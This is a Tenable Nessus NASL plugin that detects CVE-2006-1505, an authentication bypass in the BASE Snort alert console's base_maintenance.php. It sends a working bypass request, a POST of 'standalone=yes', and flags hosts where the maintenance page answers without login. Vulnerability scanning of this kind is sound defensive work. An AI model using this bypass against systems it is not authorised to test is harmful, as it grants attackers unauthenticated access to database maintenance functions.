#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21174);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-1505");
  script_bugtraq_id(17354);
  script_osvdb_id(24101);

  script_name(english:"BASE base_maintenance.php Authentication Bypass");
  script_summary(english:"Tries to bypass authentication in BASE");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to an
authentication bypass vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running BASE, a web-based tool for analyzing alerts
from one or more SNORT sensors. 

The version of BASE installed on the remote host allows a remote
attacker to bypass authentication to the 'base_maintenance.php' script
and then perform selected maintenance tasks." );
   # http://sourceforge.net/project/shownotes.php?release_id=402956&group_id=103348
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a8a83b2b" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to BASE version 1.2.4 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/26");
 script_cvs_date("$Date: 2012/07/30 20:27:51 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:secureideas:basic_analysis_and_security_engine");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/base", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/base_maintenance.php");

  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);
  # If ...
  if (
    # it does and...
    '<FORM METHOD="POST' >< res && ' ACTION="base_maintenance.php"' >< res &&
    # Use_Auth_System is enabled
    "302 Found" >< res && egrep(pattern:"^Location: +/index\.php", string:res)
  )
  {
    # Try to bypass authentication.
    postdata = string(
      #"submit=Update+Alert+Cache",
      "standalone=yes"
    );
    r = http_send_recv3(method: "POST", item: url, port: port,
      content_type:"application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(r)) exit(0);
    res = strcat(r[0], r[1], '\r\n', r[2]);

    # There's a problem if it looks like we got past authentication.
    if (
      "^Location: +/index\.php" >!< res &&
      'VALUE="Repair Tables">' >< res
    )
    {
      security_warning(port);
      exit(0);
    }
  }
}
